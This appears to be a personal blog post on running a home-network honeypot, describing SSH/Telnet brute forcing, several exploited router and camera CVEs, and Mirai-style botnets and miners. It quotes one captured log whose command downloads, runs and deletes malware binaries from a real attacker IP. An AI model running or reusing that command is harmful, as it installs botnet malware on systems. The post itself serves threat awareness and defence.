Most cybersecurity research focuses on big enterprise or industrial infrastructure. But what about our homes, our routers, our smart devices?\n\nI believe the residential space deserves more attention. That’s where real people live, and where real threats land. And guess what? Monitoring a home network gives us an unfiltered look into what’s going on across the Internet.</br>\n(*Spoiler: it’s a lot of **Mirai** and Crypto **miners***) </br>\n\n## Someone's knocking...\n\nSince I started running a honeypot in a residential network, one thing became clear: **we're under constant attack!** \n\nGovernments like to point fingers at China, Russia, North Korea. But in reality, it's often more mundane. The biggest threat to our digital lives may not be a foreign nation, but instead **the negligence of vendors and users alike!**\n![Attack Map](2025/5/yesterdays-router-todays-pivot/country-map.png)\n\n## Who's Knocking, and What are they doing??\n\nThe vast majority of attacks I observed targeted Unix-like devices, Routers, IP Cameras, NAS Boxes, etc.  \nThe attackers typically rely on two approaches:\n\n* **Brute Force Attacks** on SSH/TELNET credentials.\n![Creds-Map](2025/5/yesterdays-router-todays-pivot/creds.png)\n\n* **Exploitation of known vulnerabilities** in outdated devices.\n![Attack](2025/5/yesterdays-router-todays-pivot/attack.png)\n\nIt's not sophisticated, but it doesn't have to be! It only takes one vulnerable device to give an attacker a foothold.\n\n### Notably used CVEs\n* **CVE-2024-6047** - Command injection for GeoVision IoT systems  \n* **CVE-2024-4577** - CGI argument injection in PHP (can lead to RCE)  \n* **CVE-2023-1389** - Command injection in TP-Link Archer AX-21 routers\n\nAnd more!  \nThese aren't \"zero-days\". They're simply still relevant because **companies don’t patch, and users don’t update**!  \nThat's the real threat here.\n\n## They’re In. Now What?\n\nOnce attackers gain access, they typically drop one of three things:\n\n* A variant of **Mirai** or **Gafgyt** to enroll the device into a botnet  \n* A **cryptocurrency miner** (usually XMRig)  \n* A **downloader script** to fetch more malware  \n\n```json\n  {\n    \"ip\": \"176.65.148.181\",\n    \"port\": 2222,\n    \"country\": \"Germany\",\n    \"city\": null,\n    \"lat\": 51.2993,\n    \"lon\": 9.491,\n    \"firstSeen\": 1745895007,\n    \"lastSeen\": 1745895015,\n    \"loginPasswordAttempts\": [\n      {\n        \"timestamp\": 1745895011,\n        \"username\": \"root\",\n        \"password\": \"admin\"\n      }\n    ],\n    \"loginKeyAttempts\": [\n\n    ],\n    \"executedCommands\": [\n      {\n        \"timestamp\": 1745895014,\n        \"command\": \"cd /tmp; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_64; chmod +x KKveTTgaAAsecNNaaaa.x86_64; ./KKveTTgaAAsecNNaaaa.x86_64 ; rm -rf KKveTTgaAAsecNNaaaa.x86_64; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.x86; chmod +x KKveTTgaAAsecNNaaaa.x86; ./KKveTTgaAAsecNNaaaa.x86 ; rm -rf KKveTTgaAAsecNNaaaa.x86\",\n        \"successful\": true\n      }\n    ],\n    \"uploadedFiles\": [\n\n    ],\n    \"downloadedFiles\": [\n      {\n        \"timestamp\": 1745895014,\n        \"filename\": null,\n        \"sha\": \"811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5d4cc\"\n      },\n      {\n        \"timestamp\": 1745895014,\n        \"filename\": null,\n        \"sha\": \"9ac2e308b0b30354575bba88169283fa7439d34937a148ccb390bcec3c6e296b\"\n      }\n    ]\n  }\n```\n\n> Example of an observed log.\n\nOften, these devices aren’t the end goal—they’re stepping stones. Your router becomes **someone else’s launchpad**. A pivot point for scanning, attacking, or anonymizing future activity.\n\n## The Bots Are Winning\n\nThese threats aren’t launched by people sitting at a keyboard. What I’m observing is an **entirely automated threat landscape**.\n\nThe cycle looks like this:\n\n1. Scan\n2. Fingerprint\n3. Exploit\n4. Drop malware\n5. Monetize\n6. Move on\n\nIf it fails? No problem. Move to the next IP. It’s a numbers game, and the bots play it well.\n\n## From Curiosity to Chaos\n\nOver the weeks I’ve been running this honeypot, a clear pattern has emerged:\n\n1. A new, easy-to-exploit CVE appears\n2. A fresh botnet variant (often Mirai-based) emerges to exploit it\n3. It spreads rapidly, monetizing devices along the way\n\nIt happens fast. In days. The ecosystem is efficient, ruthless, and almost entirely unsupervised.\n\n---\n\n## Final Thoughts\n\nOur homes are on the frontlines of a silent war. And the scariest part? Most people have no idea it’s happening.\n\nIf this project has taught me anything, it’s this: **residential cybersecurity deserves more attention**. Not just for the sake of privacy or convenience, but because our homes are being conscripted into someone else’s cyberwar.\n\nWe may not be able to stop every attack, but we can do something even more powerful: **understand them**. And understanding is the first step toward fighting back.\n\n![Skibbity-Toilet](2025/5/yesterdays-router-todays-pivot/atack-logs.png)\n\n> Break-Thru, I acknowledge this blog is very boring lol; but it's meant to be formal. Hopefully if I have more time I will make some more that are fun!\n\n"}],"pagination":{"totalPages":1,"totalItems":1,"currentPage":1}},"__N_SSG":true}
